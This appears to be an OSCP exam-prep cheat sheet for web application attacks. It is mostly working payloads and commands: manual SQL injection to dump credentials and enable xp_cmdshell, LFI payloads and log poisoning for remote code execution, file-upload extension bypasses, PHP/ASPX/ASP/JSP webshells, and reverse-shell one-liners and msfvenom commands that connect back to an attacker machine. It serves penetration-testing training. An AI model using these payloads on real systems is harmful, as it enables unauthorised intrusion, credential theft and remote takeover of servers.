🌐 Web Application Attacks

Directory brute first, always. Check every parameter for SQLi. LFI → log poisoning → RCE is a common OSCP chain.

SQL Injection

sqlmap is BANNED on the OSCP exam. Everything below must be done manually. sqlmap is kept at the bottom for lab/practice use only.
step 1 — fingerprint the database
do first
# Clue 1 — check HTTP response headers (before any injection):
curl -I http://<IP>/
# X-Powered-By: ASP.NET       → likely MSSQL
# X-Powered-By: PHP/x.x       → likely MySQL / PostgreSQL
# Server: Microsoft-IIS/x.x   → likely MSSQL
# Server: Apache / nginx       → likely MySQL or PostgreSQL

# Clue 2 — error messages reveal the DB (just send a ' and read the error):
# "You have an error in your SQL syntax" → MySQL
# "Unclosed quotation mark"              → MSSQL
# "ORA-00933"                            → Oracle
# "ERROR: unterminated quoted string"    → PostgreSQL
# "SQLite3::"                            → SQLite

# Clue 3 — inject version functions (try each until one returns output):
' UNION SELECT NULL,@@version,NULL--        # MSSQL / MySQL — @@version works on both
' UNION SELECT NULL,version(),NULL--        # MySQL / PostgreSQL
' UNION SELECT NULL,banner,NULL FROM v$version-- # Oracle
' UNION SELECT NULL,sqlite_version(),NULL-- # SQLite

# Clue 4 — comment syntax differs by DB:
' OR 1=1--      # MySQL / MSSQL / SQLite (-- comment)
' OR 1=1#       # MySQL only (# comment)
' OR 1=1/*      # MySQL / MSSQL
' OR 1=1--+     # URL-encoded space after -- (MySQL quirk)

# Clue 5 — string concatenation syntax differs:
' UNION SELECT NULL,'a'||'b',NULL--         # Oracle / PostgreSQL (|| concat)
' UNION SELECT NULL,concat('a','b'),NULL--  # MySQL
' UNION SELECT NULL,'a'+'b',NULL--          # MSSQL
step 2 — detect: error-based + boolean
# Try these in every parameter (?id=, ?search=, login fields, headers)
'                        # syntax error = injectable
''                       # if first breaks but this doesn't = string context
' OR '1'='1'--
' OR 1=1--
' OR 1=2--               # compare response to 1=1 — different = boolean SQLi
admin'--                 # auth bypass: comments out password check
admin'#                  # MySQL comment alternative
' OR 1=1#
1 AND 1=1                # numeric context (no quotes)
1 AND 1=2                # numeric boolean — different response = injectable
step 3 — detect: time-based blind (no visible output)
# MySQL — 5 second delay confirms injection:
' AND SLEEP(5)--
1 AND SLEEP(5)--
'; SELECT SLEEP(5)--

# MSSQL — 5 second delay:
'; WAITFOR DELAY '0:0:5'--
1; WAITFOR DELAY '0:0:5'--

# PostgreSQL:
'; SELECT pg_sleep(5)--

# Oracle:
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
step 4 — find column count (required for UNION)
# Method 1 — ORDER BY (increment until error):
' ORDER BY 1--           # no error
' ORDER BY 2--           # no error
' ORDER BY 3--           # ERROR = 3 columns exist (use 2 in UNION)

# Method 2 — UNION NULL (add NULLs until no error):
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--   # no error = 3 columns
step 5 — find string columns (which NULLs accept text)
# Replace one NULL at a time with 'a' until it appears in response:
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--    # 'a' appears in page = column 2 is string
' UNION SELECT NULL,NULL,'a'--
step 6 — extract data (MySQL)
# DB fingerprint:
' UNION SELECT NULL,version(),database()--
' UNION SELECT NULL,user(),@@hostname--

# List all tables in current DB:
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()--

# List columns in a table:
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--

# Dump creds:
' UNION SELECT NULL,concat(username,':',password),NULL FROM users--

# Read files (if FILE privilege):
' UNION SELECT NULL,load_file('/etc/passwd'),NULL--
' UNION SELECT NULL,load_file('/var/www/html/config.php'),NULL--

# Write webshell (if FILE privilege + writable web root):
' UNION SELECT NULL,'<?php system($_GET["cmd"]); ?>',NULL INTO OUTFILE '/var/www/html/shell.php'--
step 6 — extract data (MSSQL)
# DB fingerprint:
' UNION SELECT NULL,@@version,NULL--
' UNION SELECT NULL,db_name(),NULL--
' UNION SELECT NULL,system_user,NULL--

# List databases:
' UNION SELECT NULL,name,NULL FROM sys.databases--

# List tables:
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--

# Dump creds:
' UNION SELECT NULL,concat(username,':',password),NULL FROM users--

# Check if sysadmin (1 = yes → enable xp_cmdshell):
' UNION SELECT NULL,IS_SRVROLEMEMBER('sysadmin'),NULL--

# Enable xp_cmdshell (if sysadmin):
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--
'; EXEC xp_cmdshell 'whoami';--
blind SQLi — manual boolean extraction (no output)
# Confirm DB name length first:
' AND LENGTH(database())=5--      # true/false response tells you the length

# Extract one character at a time (MySQL):
' AND SUBSTRING(database(),1,1)='a'--   # is first char 'a'?
' AND SUBSTRING(database(),1,1)='d'--   # is first char 'd'? (true = different response)

# Extract admin password hash character by character:
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='5'--

# Automate with a loop in bash (replace true_string with content present when true):
for i in $(seq 1 32); do
  for c in $(echo {0..9} {a..f}); do
    resp=$(curl -s "http://<IP>/page?id=1' AND SUBSTRING((SELECT password FROM users LIMIT 1),$i,1)='$c'--")
    echo "$resp" | grep -q "true_string" && printf "$c" && break
  done
done; echo

LFI / RFI

LFI payloads
?file=../../../../etc/passwd
?file=../../../../etc/shadow
?page=php://filter/convert.base64-encode/resource=/etc/passwd
# Decode: echo "<b64>" | base64 -d
?page=php://filter/read=convert.base64-encode/resource=config.php
?page=php://input   # POST body: <?php system($_GET['cmd']); ?>
?page=data://text/plain,<?php system($_GET['cmd']); ?>

# Windows paths:
?file=../../../../Windows/System32/drivers/etc/hosts
?file=../../../../inetpub/wwwroot/web.config
LFI → RCE via log poisoning
RCE chain
# Step 1: Inject PHP into Apache access log via User-Agent:
curl -A "<?php system(\$_GET['cmd']); ?>" http://<IP>/

# Step 2: Include the log with your command:
curl "http://<IP>/?page=../../../../var/log/apache2/access.log&cmd=id"
curl "http://<IP>/?page=../../../../var/log/nginx/access.log&cmd=id"

# Other injection points:
# /var/log/auth.log   → inject via SSH: ssh '<?php system($_GET["c"]); ?>'@<IP>
# /proc/self/environ  → inject via User-Agent in HTTP request
output signals
Signal: ?file=../../../../etc/passwd returns file contents curl "http://<IP>/?page=../../../../etc/shadow" -- try to grab shadow curl "http://<IP>/?page=php://filter/convert.base64-encode/resource=config.php" | base64 -d -- read PHP source curl -A "<?php system(\$_GET['cmd']); ?>" http://<IP>/ && curl "http://<IP>/?page=../../../../var/log/apache2/access.log&cmd=id" -- log poison for RCE
Signal: LFI confirmed but logs not readable curl "http://<IP>/?page=../../../../proc/self/environ" -- try proc/self/environ ssh '<?php system($_GET["c"]); ?>'@<IP> && curl "http://<IP>/?page=../../../../var/log/auth.log&c=id" -- poison auth.log via SSH
Signal: base64 filter works on config.php — credentials in source grep -i "pass\|user\|db\|host" decoded_config.php -- extract DB creds from source mysql -u <user> -p'<pass>' -h <IP> -- try DB creds directly
move on when traversal payloads all return same page / blank (no inclusion happening) LFI confirmed but logs are unreadable and php:// wrappers blocked RFI blocked (allow_url_include = Off confirmed via phpinfo) spent 15+ min on log poisoning paths — try file upload instead

File Upload Bypass

extension bypass tricks
# Rename shell.php to:
shell.php5   shell.php3   shell.php7   shell.phtml   shell.pHp   shell.PhP
shell.php.jpg   shell.jpg.php   shell.jpg.php5

# In Burp — change Content-Type header while sending .php:
# Content-Type: image/jpeg

# Null byte (old PHP < 5.3.4):
# shell.php%00.jpg → server saves as shell.php
PHP — create + trigger + rev shell
linux
# Create:
echo '<?php system($_GET["cmd"]); ?>' > shell.php
echo '<?php passthru($_GET["cmd"]); ?>' > shell.php   # alt if system() disabled

# Verify RCE:
curl "http://<IP>/uploads/shell.php?cmd=id"

# Trigger reverse shell (URL-encoded):
curl "http://<IP>/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/<KALI>/4444+0>%261'"

# Or use the rev shell PHP file directly:
echo '<?php exec("/bin/bash -c '\''bash -i >& /dev/tcp/<KALI>/4444 0>&1'\''"); ?>' > revshell.php
# Upload revshell.php, start listener, then:
curl "http://<IP>/uploads/revshell.php"
ASPX — create + trigger + rev shell
windows
# Create webshell:
echo '<%@ Page Language="C#" %><% var p=new System.Diagnostics.Process(){StartInfo=new System.Diagnostics.ProcessStartInfo("cmd","/c "+Request["cmd"]){RedirectStandardOutput=true,UseShellExecute=false}};p.Start();Response.Write(p.StandardOutput.ReadToEnd()); %>' > shell.aspx

# Verify RCE:
curl "http://<IP>/uploads/shell.aspx?cmd=whoami"

# Generate rev shell ASPX with msfvenom (scores on OSCP):
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f aspx -o revshell.aspx

# Start listener, upload revshell.aspx, then trigger:
curl "http://<IP>/uploads/revshell.aspx"
ASP — create + trigger + rev shell
windows
# Create webshell:
echo '<%  Response.Write(CreateObject("WScript.Shell").Exec(Request("cmd")).StdOut.ReadAll()) %>' > shell.asp

# Verify RCE:
curl "http://<IP>/uploads/shell.asp?cmd=whoami"

# Rev shell via msfvenom:
msfvenom -p windows/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f asp -o revshell.asp
curl "http://<IP>/uploads/revshell.asp"
JSP — create + trigger + rev shell (Tomcat)
tomcat
# Create webshell:
cat > shell.jsp << 'EOF'
<%@ page import="java.util.*,java.io.*" %>
<% String cmd = request.getParameter("cmd"); Process p = Runtime.getRuntime().exec(cmd);
BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
String line; while((line=br.readLine())!=null){out.println(line);} %>
EOF

# Verify RCE:
curl "http://<IP>:8080/uploads/shell.jsp?cmd=id"

# Rev shell JSP via msfvenom:
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f raw -o revshell.jsp
curl "http://<IP>:8080/uploads/revshell.jsp"
OSCP requires an interactive shell for scoring — webshells alone don't count. Always follow up with a rev shell.
output signals
Signal: Upload succeeds but .php extension is blocked mv shell.php shell.php5 -- try alternate extensions: php5 php3 phtml pHp mv shell.php shell.php.jpg -- double extension bypass -- In Burp: intercept upload, change Content-Type to image/jpeg while keeping .php extension
Signal: Upload succeeds, file accessible at /uploads/shell.php curl "http://<IP>/uploads/shell.php?cmd=id" -- verify RCE curl "http://<IP>/uploads/shell.php?cmd=bash+-i+>%26+/dev/tcp/<KALI>/4444+0>%261" -- trigger rev shell
Signal: Upload succeeds but file is not executed (served as text) -- Server not configured to execute from uploads dir. Need LFI to include it, or find exec path. curl "http://<IP>/?page=../../../../var/www/html/uploads/shell.php&cmd=id" -- chain with LFI if present
move on when all extension variants rejected and Burp Content-Type bypass also fails file uploads but is never executed (no LFI to chain with) no upload functionality found after full directory brute force
